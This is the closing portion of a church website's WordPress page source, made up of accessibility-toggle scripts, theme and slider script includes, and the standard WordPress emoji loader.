	for (var i = 0; i < alladael.length; i++) {
	alladael[i].style.display = "block";
	}	
 // document.cookie = "ar-grayscale" + "=; expires=Thu, 01 Jan 1970 00:00:01 GMT;";
  
 // document.body.className = document.body.className.replace("ar-grayscale","");	
  
}
</script><script>
if (document.cookie.indexOf("wp-adarelief") >= 0 ) adareliefopenNav();
		</script>
		<script>
jQuery(document).ready(function($) {
	if (document.cookie.indexOf("ar-highcontrast") > 0 )
    $("body").addClass("ar-highcontrast");
});
</script><script>
jQuery(document).ready(function($) {
	if (document.cookie.indexOf("ar-lightcontrast") > 0 )
    $("body").addClass("ar-lightcontrast");
});
</script><script>
jQuery(document).ready(function($) {
	if (document.cookie.indexOf("ar-grayscale") > 0 )
    $("body").addClass("ar-grayscale");
});
</script><script>
jQuery(document).ready(function($) {
	if (document.cookie.indexOf("ar-invertcolors") > 0 )
    $("body").addClass("ar-invertcolors");
});
</script><script>
jQuery(document).ready(function($) {
	if (document.cookie.indexOf("ar-saturate") > 0 )
    $("body").addClass("ar-saturate");
});
</script><script>
jQuery(document).ready(function($) {
	if (document.cookie.indexOf("ar-imgbw") > 0 )
    $("body").addClass("ar-imgbw");
});
</script><script>
jQuery(document).ready(function($) {
	if (document.cookie.indexOf("ar-readfont") > 0 )
    $("body").addClass("ar-readfont");
});
</script><script>
jQuery(document).ready(function($) {
	if (document.cookie.indexOf("ar-mousecursor") > 0 )
    $("body").addClass("ar-mousecursor");
});
</script><script>
jQuery(document).ready(function($) {
	if (document.cookie.indexOf("ar-highlight") > 0 )
    $("a").addClass("ar-mousecursor");
});
</script><script>
jQuery(document).ready(function($) {
	if (document.cookie.indexOf("ar-dysfont") > 0 )
    $("body").addClass("ar-dysfont");
});
</script><script type="text/javascript" src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/js/ada-relief-hc.js?ver=1.0" id="ada-relief-hc-js"></script>
<script type="text/javascript" src="//www.churchofantioch.org/wp-content/plugins/revslider/sr6/assets/js/rbtools.min.js?ver=6.7.39" defer async id="tp-tools-js"></script>
<script type="text/javascript" src="//www.churchofantioch.org/wp-content/plugins/revslider/sr6/assets/js/rs6.min.js?ver=6.7.39" defer async id="revmin-js"></script>
<script type="text/javascript" src="https://www.churchofantioch.org/wp-content/uploads/fusion-scripts/a45686b0b523e7c454c61699b971bc74.min.js?ver=3.14.2" id="fusion-scripts-js"></script>
<script id="wp-emoji-settings" type="application/json">
{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://www.churchofantioch.org/wp-includes/js/wp-emoji-release.min.js?ver=6.9.1"}}
</script>
<script type="module">
/* <![CDATA[ */
/*! This file is auto-generated */
const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
//# sourceURL=https://www.churchofantioch.org/wp-includes/js/wp-emoji-loader.min.js
/* ]]> */
</script>
				<script type="text/javascript">
				jQuery( document ).ready( function() {
					var ajaxurl = 'https://www.churchofantioch.org/wp-admin/admin-ajax.php';
					if ( 0 < jQuery( '.fusion-login-nonce' ).length ) {
						jQuery.get( ajaxurl, { 'action': 'fusion_login_nonce' }, function( response ) {
							jQuery( '.fusion-login-nonce' ).html( response );
						});
					}
				});
				</script>
						</div>

			<section class="to-top-container to-top-right" aria-labelledby="awb-to-top-label">
		<a href="#" id="toTop" class="fusion-top-top-link">
			<span id="awb-to-top-label" class="screen-reader-text">Go to Top</span>

					</a>
	</section>
		</body>
</html>
